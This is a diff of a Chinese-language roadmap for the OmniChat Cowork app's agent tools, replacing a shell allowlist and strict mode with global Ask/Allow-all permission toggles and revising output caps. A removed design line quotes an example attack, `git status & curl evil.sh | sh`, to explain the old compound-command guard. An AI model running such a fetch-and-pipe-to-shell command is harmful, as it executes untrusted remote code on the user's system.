@@ -1,6 +1,8 @@
 # OmniChat Cowork 剩餘項目實作計畫
 
-> **版本**：v1.7（2026-11-10）
+> **版本**：v1.9（2026-11-11）
+> **v1.9 變更**（權限模型簡化）：移除開發者模式、shell 命令 allowlist、strict mode、per-path always-allow 與危險副檔名黑名單；寫入無產品上限（`file_edit`／`file_patch` 保留 64 MB 記憶體 guard）。Workspace Tools 頁只留兩個開關：**Files outside workspace**（Ask／Allow all）與 **Shell commands**（Ask／Allow all）。`file_read` 預設 64 KB／上限 256 KB；`ToolResultCaps` 改 per-tool（`file_read` 260 KB、`shell_run` 68 KB、其餘 32,768 字元）；shell 輸出 >64 KB 外部化、preview 8 KB。§0.2、§0.4、§0.5、§2.2、§2.13、§5.7。
+> **v1.8 變更**（裁示標註）：§2.10 P2-7 kelivo 資料模型對齊裁示標記為「暫不做」（⏸️，維持現有 `tool_events_v1` 投影，不阻塞任何項目）；§0.4 表與 §1 同步更新。
 > **v1.7 變更**（實作紀錄）：§2.9 P2-6 L3 工作區檔案地圖注入落地（✅）——組裝期 `file_list` 註冊時注入 token 預算內的 workspace 檔案清單；重用 `WorkspaceSnapshot.capture` 掃描、dot 段全遮蔽、穩定樹事實渲染（快取前綴契約）、三段預算降級；§0.4 表同步。
 > **v1.6 變更**（實作紀錄）：§2.11 P3-1 瀏覽器 QA 落地（✅）——STDIO 傳輸 UI＋Playwright 一鍵預設（桌面限定）、STDIO 連線錯誤分類、MCP 圖片落盤＋工具卡預覽；§0.4 表與 §1 Wave D 同步。
 > **v1.5 變更**（實作紀錄）：§2.17 記錄 `file_grep`（regex 內容搜尋，✅）與 `file_view_image` Stage 1（🔶，工作區圖片檢視＋工具卡預覽；Stage 2 vision plumbing 待做）的落地細節——代碼、測試與紀錄隨 commit `11adb10a` 提交；§0.5 view_image 落點補記實作狀態。
@@ -10,7 +12,7 @@
 > **v1.1 變更**：吸收 kelivo workspace 調查（`chevey339/kelivo` @ `51777f7`；workspace 為上游 v1.3.0／2026-09-22 引入，**晚於原計畫調查基準 `7125a25`**）——**接受全部導入建議**：新增 §2.16 P1-8（file_edit 三段式容忍匹配，即刻可做）；§2.2 P1-6 併入五項導入增量＋一項可選（環境旗標／FileSnapshot changed_files／結構化 payload／輸出外部化至 app 私有 session dir／ToolRun 即時串流；可選桌面 companion）；§2.15 升級為 Myers unified diff；§2.4 P2-1 補 ConversationToolPermissions 工程參考；§2.8 P2-5 補 kelivo `sandbox/` 對照實作；§2.17 可選週邊；§6 參考表新增 workspace 對照。未採納的設計分歧記錄於 §0.5。
 > **來源**：`IMPORT_PLAN_COWORK_20260911.md`（v1.9，2026-09-11）Phase 1–3 未竟項目整理，項目編號沿用原計畫
 > **性質**：跨多版本的路線圖＋實作計畫。**各項開工前應再出該項的細部執行計畫**（比照 `IMPORT_PLAN_CROSS_TURN_TOOL_RESULTS.md` 粒度：逐檔案、逐測試）。
-> **狀態標記**：⬜ 未動工 ｜ 🟡 部分完成（有尾款）｜ ✅ 完成 ｜ ⛔ 結案移除
+> **狀態標記**：⬜ 未動工 ｜ 🟡 部分完成（有尾款）｜ ✅ 完成 ｜ ⛔ 結案移除 ｜ ⏸️ 暫不做
 
 ---
 
@@ -29,6 +31,7 @@
 | P1-4 長輸出外部化 | 2026-09-12 回撤，改為純記憶體上限 `tool_result_caps`（工作區零殘留裁示） |
 | P1-5 工作區快照回滾 | 2026-09-10 完全移除（復原交使用者自己的 git） |
 | MCP 工具審批 | 2026-09-10（v1.6）移除——MCP 免審直接執行 |
+| 開發者模式／shell allowlist／strict mode／per-path always-allow／危險副檔名黑名單／512 KB-2 MB 寫入上限 | 2026-11-11 移除——改為兩個全域開關（Files outside workspace／Shell commands，各 Ask／Allow all）；寫入無產品上限（`file_edit`／`file_patch` 64 MB 記憶體 guard）；見 §2.2／§2.13 |
 | P2-1 啟動恢復橫幅＋P3-3「進行中任務」頁 | 2026-11-09 裁示移除（UI 面）——橫幅屬推播式恢復、實測打擾；任務頁屬拉取式、無使用。恢復收斂為對話內就地式（pending 卡／部分訊息即動作點）；P2-1 寫入地基保留；見 §2.4／§2.12 |
 
 ### 0.3 本版裁示不採（2026-11-06，自計畫移除）
@@ -45,7 +48,7 @@
 |:--|:--|:--|:--:|:--|
 | P0-3(尾) | legacy 傳輸層工具迴圈移除（+ Neuralwatt parity 可選） | kelivo providers 分層 | ✅（2026-11-06：四條 transport 迴圈全刪、`onToolCall`／`exposeToolCallsOnly` 退場、kill-switch 移除；見 `docs/P0-3_legacy_tool_loop_removal_plan.md`） | v1.29.x |
 | P1-2(尾) | `cache_expiry` 觸發（30 分鐘閒置壓縮） | AnyBuff 觸發器 | ✅（2026-11-06：以最後成功 usage 為活動錨點；見 §2.3） | v1.30.x |
-| P1-6 | 桌面開發者模式 + Allowlist Shell（`shell_run`）**＋ kelivo 導入增量** | ADR-A8/A9 + 執行契約已內化於 §2.2（原 CLI v4 §五/§六）+ kelivo workspace | ✅（2026-11-06；見 §2.2 落地紀錄） | v1.29.x |
+| P1-6 | 桌面 Shell（`shell_run`）＋兩個全域權限開關（Files outside workspace／Shell commands） | ADR-A8/A9 + 執行契約已內化於 §2.2（原 CLI v4 §五/§六）+ kelivo workspace | ✅（2026-11-06；2026-11-11 移除 dev mode／allowlist，見 §2.2） | v1.29.x |
 | P1-8 | file_edit 三段式容忍匹配（kelivo 導入，**即刻可做**） | kelivo `edit_matchers.dart`（RikkaHub TextReplacers 移植） | ✅ | v1.29.x |
 | P2-1 | Checkpoint 持久化（durable-before-dispatch） | deepseek-harness | ✅（2026-11-07：`agent_runs_v1`；2026-11-09 啟動橫幅隨 P3-3 一併移除；見 §2.4） | v1.30.x |
 | P2-2 | 背景長任務（桌面托盤 + Android 前景服務） | 既有基建 + P2-1 | ⬜ | v1.31.x |
@@ -53,10 +56,10 @@
 | P2-4 | Mini dev server + Live 預覽 | 既有 `html_preview_*` + 新 dev server | ✅（2026-11-08：loopback 靜態伺服器、SSE 重整、`get_console_errors`、分頁面板；見 §2.7） | v1.31.x |
 | P2-5 | Proot on Android（**stretch**；kelivo `sandbox/`＋AnyBuff `android/` engine 為對照實作） | 藍圖已內化於 §2.8（原 CLI v4 §七/§十五）+ kelivo v1.3.0+ | ⬜ | 視需求 |
 | P2-6(L3) | 工作區檔案地圖注入（**僅 L3**；L2 LLM 摘要不採） | AnyBuff `truncate-file-tree` 概念 | ✅（2026-11-10：組裝期注入、`WorkspaceSnapshot` 掃描重用、預算三段降級、快取前綴契約；見 §2.9） | v1.32.x |
-| P2-7 | kelivo 資料模型對齊（**可選**） | kelivo `a43b79f` | ⬜ | 視需求 |
+| P2-7 | kelivo 資料模型對齊（**可選**） | kelivo `a43b79f` | ⏸️ 暫不做 | 視需求 |
 | P3-1 | 瀏覽器 QA 工具（Playwright via MCP，桌面限定） | MCP + Playwright | ✅（2026-11-10：STDIO 傳輸 UI＋Playwright 一鍵預設、連線錯誤分類、MCP 圖片落盤＋工具卡預覽；見 §2.11） | v1.32.x |
 | ~~P3-3~~ | ~~跨會話任務恢復（「進行中任務」頁）~~ **已移除**（2026-11-09 裁示；見 §2.12） | P2-1 延伸 | ⛔ 已移除 | — |
-| P3-4 | 上限再校準 + 磁碟預算（dev mode 寫入 2MB 級） | — | ✅（2026-11-08：dev mode 2MB、Tools 頁磁碟用量、`file_read` 24KB 預設窗口；見 §2.13） | v1.32.x |
+| P3-4 | 上限再校準 + 磁碟預算（無寫入產品上限） | — | ✅（2026-11-08；2026-11-11 改版：寫入無產品上限、`file_read` 64KB／256KB、per-tool caps；見 §2.13） | v1.32.x |
 | ~~P3-5~~ | ~~Plan Mode（先規劃 → 人批 → 再執行）~~ **不實作**（見 §2.14 裁示） | deepseek plan-mode | ❌ 已移除 | — |
 | P1-1(尾) | 執行後全檔 diff viewer（原計畫歸 Phase 3；Myers unified diff） | RikkaHub `diffOf` + kelivo `unified_diff` | ✅（2026-11-08：Myers unified diff、卡片 ±N、展開全檔變更；見 §2.15） | v1.29.x |
 
@@ -71,7 +74,7 @@
 | A | `edit_matchers.dart`（~276 行） | file_edit 三段式容忍匹配：`exact → line_trimmed → block_anchor`＋ambiguous 策略標示 | **§2.16 新項 P1-8**（即刻可做，介面不動） |
 | B | `unified_diff.dart`（~215 行） | Myers diff（`diffutil_dart`）＋hunks＋±N 計數＋64KB 截斷 | **§2.15** diff viewer／審批卡換芯 |
 | C | `tool_run_registry.dart` + `shell_output_buffer.dart` | 工具**即時串流輸出**：50ms 節流、ANSI CSI 進度行替換、UTF-8 chunk-safe、bounded tail（200 行/32KB）、LRU（200 條/8MB） | **§2.2 P1-6 增量 5** |
-| D | `workspace_tools_service.dart` shell 段 + `conversation_files.dart` + `output_buffer.dart` | 五個 agent 友善環境旗標、`FileSnapshot`（`(mtime, size)`）→ `changed_files`、結構化 payload、輸出外部化（合計 >32KB、preview 各 4KB）——**裁定：唯讀 session-outputs zone ＋ retention 20 檔/7 天**（見 §2.2 增量 4） | **§2.2 P1-6 增量 1–4** |
+| D | `workspace_tools_service.dart` shell 段 + `conversation_files.dart` + `output_buffer.dart` | 五個 agent 友善環境旗標、`FileSnapshot`（`(mtime, size)`）→ `changed_files`、結構化 payload、輸出外部化（合計 >64KB、preview 各 8KB）——**裁定：唯讀 session-outputs zone ＋ retention 20 檔/7 天**（見 §2.2 增量 4） | **§2.2 P1-6 增量 1–4** |
 | E | `sandbox/` 全目錄 | PRoot/iSH 沙盒對照實作（channel/PTY、installer 狀態機、鏡像測速） | **§2.8 P2-5** 對照參考 |
 | — | `ConversationToolPermissions` | 授權屬對話、序列化寫入、revision fencing、`context_changed` 防護 | **§2.4 P2-1** 工程參考 |
 | — | `file_link_resolver.dart` / `workspace_session_sync.dart` / 行動 terminal | 可選週邊 | **§2.17** |
@@ -81,8 +84,8 @@
 
 | kelivo 做法 | OmniChat 現案 | 裁定 |
 |:--|:--|:--|
-| 桌面 shell 一律審批（無 allowlist 概念） | ADR-A9 allowlist 免審 + 複合守衛 + ask | 維持現案 |
-| 對話級 `fullAccess` 一鍵跳過審批 | strict mode + always-allow override（per-command/path） | 不跟進（風險敘事不利商店合規）；其持久化工程已列 P2-1 參考 |
+| 桌面 shell 一律審批（無 allowlist 概念） | 2026-11-11 改為 Ask／Allow all 兩態（無 allowlist） | 與 kelivo 同方向；差別是保留五態持久化與逾時 |
+| 對話級 `fullAccess` 一鍵跳過審批 | 全域 Shell commands: Allow all（非對話級）＋五態審批 | 不跟進對話級 fullAccess；改為全域開關 |
 | managed/linked 多工作區 + 外部掛載（10 個 RO/RW 持久授權） | assistant-bound WorkspaceConfig + 出界逐次 ask | 不跟進（架構分岔過大） |
 | 桌面環境完整繼承 `Platform.environment`（無 allowlist） | CLI v4：`includeParentEnvironment: false` + allowlist + secret 遮蔽 | 維持現案（更安全） |
 | `.app.html` 隔離離線 web app | P2-4 dev server（服務整個 workspace） | 路線不同；若 P2-4 未來做離線互動小工具再回看 |
@@ -99,8 +102,8 @@
   P1-8 file_edit 三段匹配（kelivo 導入；獨立小項、介面不動、即刻可做）
 
 【Wave B：Phase 1 收尾】
-  P1-6 開發者模式 + shell（審批引擎 P1-1 已備妥擴充點）
-    ├──→ P3-4 上限再校準（dev mode 落地後才有意義）
+  P1-6 桌面 shell + 兩個權限開關（審批引擎 P1-1 已備妥擴充點）
+    ├──→ P3-4 上限再校準（Workspace Tools 頁的權限開關落地後才有意義）
     └──→ P3-1 瀏覽器 QA（外部程序治理基建共用；非硬依賴，可提前）
 
 【Wave C：「可恢復」地基】
@@ -118,7 +121,7 @@
   P2-3 子代理 ｜ P1-1 尾款 diff viewer（✅）
 
 【Stretch / 可選】
-  P2-5 Proot（stretch） ｜ P2-7 kelivo 對齊（可選）
+  P2-5 Proot（stretch） ｜ P2-7 kelivo 對齊（可選，暫不做 ⏸️）
 ```
 
 **一句話**：先做 **P0-3 尾款**（最便宜、消除持續風險）、**P1-8**（獨立小項、即刻可做）與 **P1-6 + P2-1**（其餘多項的地基）；「製作網站」閉環走 **P2-4 → P3-1**；P3-4 等 P1-6 落地後收尾。
@@ -150,7 +153,9 @@
 
 ---
 
-### 2.2 P1-6 桌面開發者模式 + Allowlist Shell（`shell_run`）✅【2026-11-06 完成】
+### 2.2 P1-6 桌面 Shell（`shell_run`）✅【2026-11-06 完成；2026-11-11 權限模型簡化】
+
+> **2026-11-11 改版（現行規格）**：移除 `developer_mode_v1`、`shell_allowlist_v1`、`shell_policy.dart`、strict mode、always-allow 與 PATH readiness。Shell 是普通桌面工作區工具；Workspace Tools 頁的 `shellAllowAllV1`（key `shell_allow_all_v1`，預設 false）決定 **Ask**／**Allow all**。Ask = 每個命令一張卡（本次允許／拒絕；不再有永遠允許）；Allow all = 直接執行。`ShellRunService.execute` 只收 `allowAll`／`approvedCommand`；`ToolResultCaps` shell 預算 68 KB。以下 2026-11-06 落地紀錄保留為歷史。
 
 > **藍圖**：原《CLI 工具整合計畫 v4》§三~§六、§八——執行工程契約**已逐項內化於下文**（原文已封存，不需回查）；其 blocking 確認框不採（ADR-A9）。命名維持 `shell_run`。
 > **Phase 1 最後一項功能（2026-11-06 落地）**；手冊 §7.2 官方待辦第一條。
@@ -158,20 +163,20 @@
 > **落地紀錄（2026-11-06）**：新增 `lib/core/services/shell/`——`shell_policy.dart`（allow/ask/deny、複合命令逐段、`programsIn` 正規化）、`cli_process_supervisor.dart`（只用 `Process.start()`、collectors 先於 wait、超 cap 持續 drain、timeout/cancel 以 Job Object 終止整棵樹、`taskkill /T` fallback、UTF-8 `allowMalformed`）、`windows_job_object.dart`（純 `dart:ffi`，未新增 `win32`/`ffi` 直接相依）、`changed_files.dart`（`(mtime,size)` 前後快照、cap 20k/50）、`tool_run_registry.dart`（50ms 節流、ANSI/`\r`、200 行/32KB、LRU 200/8MB）、`shell_run_service.dart`（dev mode/PATH readiness、cwd/timeout、env allowlist＋五旗標、secret 遮蔽、結構化 payload、>32KB 外部化）。輸出落 `{appSupport}/tool_outputs/{conversationId}/{toolCallId}.txt`；`session_outputs.dart` 提供 sweep（20 檔/7 天）與刪除清理，`FileToolService` 新增唯讀 zone（僅 `file_read`/`file_search`，寫入一律拒）。設定新增 `developer_mode_v1`／`shell_allowlist_v1`（皆同步，見 §5.7）；strict 沿用既有 `approval_strict_mode_v1`，不新增重複開關。UI：設定→Developer mode（總閘、allowlist、PATH probe）、Workspace Tools 條件列、審批卡完整命令/blocked programs、工具卡 `ShellLiveTail`；l10n 四語系。測試新增 `shell_policy_test`／`session_outputs_test`／`tool_output_read_test`／`cli_process_supervisor_test`／`shell_run_service_test`；2026-11-06 review 修正再加入 `changed_files_test`，相關 10 檔 142 案全綠。`flutter analyze --no-pub` 0 errors（既有 warnings/info 不計）。
 > **與計畫的差異**：stdout/stderr 捕獲上限由 24KB/6KB 提高為 1MB/256KB——原上限合計 30KB，使 >32KB 外部化分支永遠不可達；模型端仍由 `ToolResultCaps` 限 32,768 字元（手冊 §5.1 第 7 點）。
 
-**目標**：桌面（Windows）提供受控的命令執行工具 `shell_run`，以「開發者模式」總閘 + 三層命令政策實現可監督的 shell 能力；Android 不提供。
+**目標**：桌面（Windows／macOS／Linux）提供 `shell_run`，以「每個命令一張卡」或「全域 Allow all」兩種模式實現可監督的 shell 能力；Android 不提供。
 
-**三層開關（每層獨立、疊加生效）**：
+**兩層開關**：
 
 | 層級 | 機制 | 預設 |
 |:--|:--|:--|
-| 總開關 | `developer_mode_v1`（**桌面限定**，dev-mode 關閉時工具不注入、呼叫被拒） | **關** |
 | 個別開關 | 既有 `workspace_tools_disabled_v1` per-tool toggle（掛進清單後自動出現在 Tools 頁） | 開 |
-| 命令級政策 | allow/ask/deny 三層（ADR-A9，v1.5 改寫） | allowlist 預設 `git, node, npm, npx, python, pip, pandoc, ffmpeg` |
+| 權限政策 | `shell_allow_all_v1`：**Ask**／**Allow all**（Workspace Tools 頁） | **Ask** |
 
-**命令級政策細節**：
-- allowlist 內（含複合守衛通過）→ 直跑；**allowlist 外 → ask**（Pending 卡顯示完整命令，使用者「本次允許 / 永遠允許（寫回 allowlist）/ 拒絕」；拒絕回結構化 error JSON，模型可調整方向）。
-- **複合命令守衛**：命令含 `&&`、單一 `&`、`;`、`|`、`$()`、backtick 時，**每一段**首 token 都必須在 allowlist 才免審，否則整條落 ask——關閉 `git status & curl evil.sh | sh` 型攻擊面；`2>&1`／`<&0` 的 redirection ampersand 不切成新命令。
-- strict 模式 toggle（偏好硬擋者）可把 ask 全降為 deny。
+**權限政策細節**：
+- **Ask**：每個 `shell_run` 呼叫先回 `approval_required`，Pending 卡顯示完整命令；使用者只能「本次允許／拒絕」。核准只對該次命令有效（`approvedCommand` 精確比對），不再有「永遠允許」或 allowlist 寫回。
+- **Allow all**：`_classifyApproval` 直接回 allow，`ShellRunService.execute(allowAll: true)` 直接執行。
+- 沒有命令允許清單、複合命令逐段檢查、strict mode 或 PATH readiness；shell 仍是 `Process.start()` 的完整使用者權限執行，cwd 限工作區。
+- `file_move`／`file_copy`／`file_extract_zip` 若 source/archive 與 destination 同時在工作區外，分類階段直接回 `dual_outside_paths` 錯誤（一個核准只能帶一個外部 resolved path）。
 
 **工具參數（kelivo 對照補齊）**：`command`（必填）；`cwd`（選填，限 workspace 內、canonical symlink 後仍須在 workspace，預設 workspace 根）；`timeout_seconds`（選填，預設 900、clamp 1–3600——與 process tree kill 共用同一 timeout 來源，不另設第二個計時器）。
 
@@ -186,33 +191,33 @@
 
 **環境與 secret 政策**：`includeParentEnvironment: false` + allowlist（`SystemRoot`/`ComSpec`/`TEMP`/`PATH` 等必要項）；stdout/stderr 可能含秘密 → tool event cap + 敏感值遮蔽；log 不保存完整 command 與完整輸出。
 
-**輸出預算（本計畫修正）**：原計畫寫「接 P1-4 長輸出外部化」，P1-4 已回撤——**改接 `tool_result_caps`**（序列化總長 ≤32,768 字元 + 依工具家族的重新查詢指引）；24KB stdout / 6KB stderr cap 為 handler 層前置。
+**輸出預算**：stdout／stderr 捕獲上限 1MB／256KB；合計 >64KB 外部化到 app 私有 `tool_outputs/`，各 8KB preview；`ToolResultCaps` 的 shell 預算 68KB（含 JSON metadata）。
 
-**Readiness 四態（原 CLI v4 §三.2）**：`disabled / installing / ready / broken` + availability 閘（function calling ∧ workspace ∧ shell enabled ∧ **allowlist 成員實際存在於 PATH 的 probe**）；UI 顯示狀態與可理解錯誤。
+**Readiness**：只保留平台閘（桌面）與工作區閘；不再有 PATH probe、allowlist availability 或 `disabled / installing / ready / broken` 四態。
 
-**ShellConfig 快照**：generation 準備時一次捕獲（cwd、dialect、allowlist、審批政策）；generation 進行中 UI 變更不修改已建立 handler（與 File Tools 同一份 snapshot）。
+**ShellConfig 快照**：generation 準備時捕獲 cwd／dialect／`shellAllowAllV1` 政策；generation 進行中 UI 變更不修改已建立 handler（與 File Tools 同一份 snapshot）。
 
-**政策分級（ADR-A8）**：開發者模式內允許在工作區建 `.sh/.ps1` 等腳本檔（黑名單例外僅桌面+opt-in），執行時把直譯器加入 allowlist 即可執行；**Android 維持全黑名單、不提供 `shell_run`**。
+**檔案層**：不再有危險副檔名黑名單；`.sh/.ps1/.exe` 等可由 `file_write` 建立，再由 `shell_run` 執行（Ask 模式會先出卡）。**Android 不提供 `shell_run`**。
 
-**審批整合（底座已備）**：P1-1 審批引擎 `decodeApprovalOverrideKey` 刻意設計為「未知 key 形狀回 null」——新增 shell 政策源不破壞既有清單；「永遠允許」寫回 allowlist 儲存；Pending 逾時／resume／AI Team slot 繼承快照全沿用既有機制。
+**審批整合**：沿用 P1-1 五態與 pending 逾時（shell 30 分鐘）；只保留一次性核准，沒有 override key／always-allow 清單；AI Team slot 繼承 generation 快照的既有語意不變。
 
-**實作檔案（建議）**：`lib/core/services/shell/`（新：`cli_process_supervisor.dart`、`shell_policy.dart`、`shell_run_service.dart`）；`settings_provider.dart`（`developer_mode_v1`、allowlist、strict mode）；`tool_handler_service.dart`（definition 條件式註冊——**必須自查 developer mode**，比照 memory 看 `enableMemory`、skill 看 `skillsPreloadEnabled` 的既有條件式模式；handler 分支；`_classifyApproval` shell 源）；`approval.dart`（shell 政策源 + override key 解碼）；Workspace Tools 頁自動跟隨；桌面設定 UI（dev mode 總閘 + allowlist 編輯）。
+**實作檔案（現行）**：`lib/core/services/shell/`（`cli_process_supervisor.dart`、`shell_run_service.dart`；`shell_policy.dart` 已刪除）；`settings_provider.dart`（`shell_allow_all_v1`、`file_outside_workspace_allow_all_v1`）；`tool_handler_service.dart`（桌面平台條件式註冊；`_classifyApproval` 的 shell / file 兩個來源）；`approval.dart`（簡化為 allow/ask，無 override key）；Workspace Tools 頁兩個開關。
 
 **kelivo 導入增量（2026-11-06 調查，§0.5）**——CLI v4 執行契約之上的六項補強：
 
 1. **Agent 友善環境旗標**（可先行建置）：在 env 組裝處固定加入 `NO_COLOR=1`、`CI=true`、`PAGER=cat`、`TERM=dumb`、`LANG=C.UTF-8`——防彩色碼／互動 pager 汙染輸出（與環境 allowlist、secret 遮蔽並存；kelivo 桌面 shell 實測同款）。
 2. **`FileSnapshot` changed_files**（基建可先行，~90 行）：shell 執行前後對 workspace 根做 **`(mtime, size)` 二元組**快照（純記憶體、cap 20k 條、跳點目錄）→ 結果帶 `changed_files`（cap 50 + `changed_files_truncated`）——**告訴模型與使用者這條命令改了哪些檔案**（審計＋模型自省；快照不落盤，零殘留不變）。**已知限制（照實寫）**：仍屬**近似審計**——同 mtime tick 且同 size 的修改、或刻意保留 mtime 的工具（`touch -r` 等）會漏報；兩次全樹 walk 在 20k 條上限內，成本與 `file_search` 同級可接受。
 3. **結構化 shell payload**：`exit_code / duration_ms / timed_out / cancelled / interrupted / truncated` 隨結果 JSON 回傳——模型可據此自判重試策略。
-4. **輸出外部化（app 私有）＋唯讀 session-outputs zone（本版裁定）**：kelivo 規格——stdout+stderr **合計 >32KB** 才觸發、preview 各 4KB、檔名 `outputs/<toolCallId>.txt`（無內建 retention）。OmniChat 落點＝ `{appSupport}/tool_outputs/{conversationId}/{toolCallId}.txt`（**app 資料目錄，非工作區**——工作區零殘留不變），payload 帶 `output_file` 模型路徑。
+4. **輸出外部化（app 私有）＋唯讀 session-outputs zone（本版裁定）**：目前規格——stdout+stderr **合計 >64KB** 才觸發、preview 各 8KB、檔名 `outputs/<toolCallId>.txt`（無內建 retention）。OmniChat 落點＝ `{appSupport}/tool_outputs/{conversationId}/{toolCallId}.txt`（**app 資料目錄，非工作區**——工作區零殘留不變），payload 帶 `output_file` 模型路徑。
    - **讀取路徑裁定（阻斷點）**：**① 新增唯讀 session-outputs zone（採用）**——`FileToolService` 路徑解析層加明確 root 的唯讀區，僅 `file_read`/`file_search` 可進、寫入一律拒；② 專用工具 `read_tool_output`（不採：介面冗餘）；③ 放棄外部化回純記憶體上限（不採：長 build log 取回價值高）。
    - **retention（必做）**：每對話最多 20 檔／7 天（比照已回撤 P1-4 的 sweep 參數）、訊息/對話刪除時同步清理；sweep 於寫入時機會式執行。`outputs` 不進 `changed_files`（它在工作區外——正確行為，非漏報）。
-   - **預算契約照手冊 §3.14 §5 F1 教訓**：payload 加料（preview＋output_file＋指引）必須從自身 32,768 預算扣除。
+   - **預算契約照手冊 §3.14 §5 F1 教訓**：payload 加料（preview＋output_file＋指引）必須從自身 shell 68KB 預算扣除。
 5. **ToolRun 即時串流**（UI 增強）：執行中工具卡顯示即時輸出——50ms 節流 notify、ANSI CSI 解析（`\r` 進度行替換，npm/ffmpeg 進度條不洗屏）、UTF-8 chunk-safe 解碼、bounded tail（200 行/32KB）、LRU 驅逐（200 條/8MB）、`finishHandoff` 防模型未交接即被驅逐；與 `CliProcessSupervisor` 的 collectors drain 接線（drain 位元組餵給 ToolRun）。**整合語意（明確定義）**：registry key＝`(conversationId, toolCallId)`（P1-4 id-aware 契約已貫通，kernel/legacy 皆帶 provider call id）；工具卡以 `ChangeNotifier` 訂閱**疊加**在已持久化 tool event 之上；**reload／跨頁面僅剩終態**（registry 為 process-lifetime，重啟後由 tool event 顯示最終輸出，無即時 tail）——測試需覆蓋此行為。
 6. **（可選）桌面 companion**：`revealInFileManager` / `openInSystemTerminal`（在檔案總管顯示／開系統終端機）；行動 in-app terminal 見 §2.17（依賴 P2-5 的沙盒 PTY）。
 
 **文件**：手冊 §5.1 新增「外部程序治理」子節、§3.1 措辭更新（「預設沙盒；沙盒外寫入需逐次明示核准」）。
 
-**測試（重點矩陣）**：三層政策（allowlist 內含複合守衛通過直跑；外 → ask 不再即時拒絕；strict 降級）、複合命令守衛（`&&`/單一 `&`/`;`/`|` 切分後每段首 token 皆須在清單；`2>&1` 不切分）、「永遠允許」寫回 allowlist、dev-mode 關閉時工具不注入/呼叫被拒；process 契約——collectors 先於 wait 建立、超 cap 持續 drain、timeout 終止整個 process tree（Job Object）、cancellation 不被吞且子程序與 collectors 皆回收、parent environment 不完整繼承、tool exception 不中斷 stream（error JSON 透傳）、cwd 限縮 workspace 內（含 symlink 逃逸拒絕）、CJK/cp950 編碼、foreground FIFO 排隊、secret 遮蔽；AI Team slot 繼承 shell tools（deny/非成員回傳 result 不中斷流程）。**kelivo 導入增量**：50ms 節流與 tail/LRU 上限、ANSI 進度行替換（`\r`）、changed_files 快照（新增/修改、同 mtime 不同 size 可偵測、cap 20k 截斷且截斷時不誤報刪除）、`output_file` 外部化 round-trip（>32KB 觸發、preview 4KB、唯讀 zone 讀取、寫入被拒、retention 20 檔/7 天、對話刪除與 clearAll／restore 清理）、shell payload 總長 ≤32,768（F1 教訓）、`timeout_seconds` clamp（1–3600、預設 900）與 `cwd` 越界拒絕、ToolRun reload 後僅終態。
+**測試（重點矩陣）**：Ask／Allow all（Ask 回 `approval_required`、核准帶 `approvedCommand` 才執行、Allow all 直跑）、無 allowlist／strict／always-allow；process 契約——collectors 先於 wait 建立、超 cap 持續 drain、timeout 終止整個 process tree（Job Object）、cancellation 不被吞且子程序與 collectors 皆回收、parent environment 不完整繼承、tool exception 不中斷 stream（error JSON 透傳）、cwd 限縮 workspace 內（含 symlink 逃逸拒絕）、CJK/cp950 編碼、foreground FIFO 排隊、secret 遮蔽；AI Team slot 繼承 shell tools（deny/非成員回傳 result 不中斷流程）。**kelivo 導入增量**：50ms 節流與 tail/LRU 上限、ANSI 進度行替換（`\r`）、changed_files 快照（新增/修改、同 mtime 不同 size 可偵測、cap 20k 截斷且截斷時不誤報刪除）、`output_file` 外部化 round-trip（>64KB 觸發、preview 8KB、唯讀 zone 讀取、寫入被拒、retention 20 檔/7 天、對話刪除與 clearAll／restore 清理）、shell payload 總長 ≤68KB（F1 教訓）、`timeout_seconds` clamp（1–3600、預設 900）與 `cwd` 越界拒絕、ToolRun reload 後僅終態。
 
 ---
 
@@ -323,7 +328,7 @@
    ```
    `/workspace` 為 guest path、File Tools 用 host physical path——兩者必須映射到同一實體目錄（由 `WorkspaceMountTable` 保證，見 7）。
 2. **工具參數**：`command`（必填）；`cwd`（workspace 根之子目錄，預設根；禁 host absolute path 與 `..`；執行期對應 guest `/workspace` 下的相對位置）；`timeout_seconds`（v4 草案值：預設 30、hard 120——與 P1-6 kelivo 增量的 900／clamp 1–3600 **不同**，併批準則見整合註記）。Android 無 `shell` 參數——固定 guest `/bin/sh`；rootfs 含 Bash 時才可比照以 login Bash＋positional arguments 傳遞 cwd/command。
-3. **Runtime layout 與 process 契約**：rootfs 與 runtime 皆置 app 私有目錄 `{appData}/cli_runtime/`（`bin/`、`rootfs/<version>/`、`tmp/`、`cache/`、`locks/`、`metadata.json`）。通用外部程序契約沿用 §2.2 執行契約（collectors 先於 wait、超 cap 持續 drain、序列化總長 ≤32,768 字元、UTF-8 `allowMalformed` 解碼）；Android 專屬：PRoot 以 **`--kill-on-exit`** 啟動，確保 PRoot 結束時 guest child 不殘留（不可只依賴對 PRoot 父進程的單獨 kill）；guest 端 `LANG=C.UTF-8` 由 rootfs patcher 設定。**guest 環境以 `env -i` 式全 wipe 起始**——不繼承 host 環境，僅由 command builder 補最小集 `HOME`／`PATH`／`LANG=C.UTF-8`（kelivo 上游 `env -i` 行為；藍圖原僅明定 LANG，2026-11-06 補齊 wipe 語意）。
+3. **Runtime layout 與 process 契約**：rootfs 與 runtime 皆置 app 私有目錄 `{appData}/cli_runtime/`（`bin/`、`rootfs/<version>/`、`tmp/`、`cache/`、`locks/`、`metadata.json`）。通用外部程序契約沿用 §2.2 執行契約（collectors 先於 wait、超 cap 持續 drain、序列化總長 ≤68KB、UTF-8 `allowMalformed` 解碼）；Android 專屬：PRoot 以 **`--kill-on-exit`** 啟動，確保 PRoot 結束時 guest child 不殘留（不可只依賴對 PRoot 父進程的單獨 kill）；guest 端 `LANG=C.UTF-8` 由 rootfs patcher 設定。**guest 環境以 `env -i` 式全 wipe 起始**——不繼承 host 環境，僅由 command builder 補最小集 `HOME`／`PATH`／`LANG=C.UTF-8`（kelivo 上游 `env -i` 行為；藍圖原僅明定 LANG，2026-11-06 補齊 wipe 語意）。
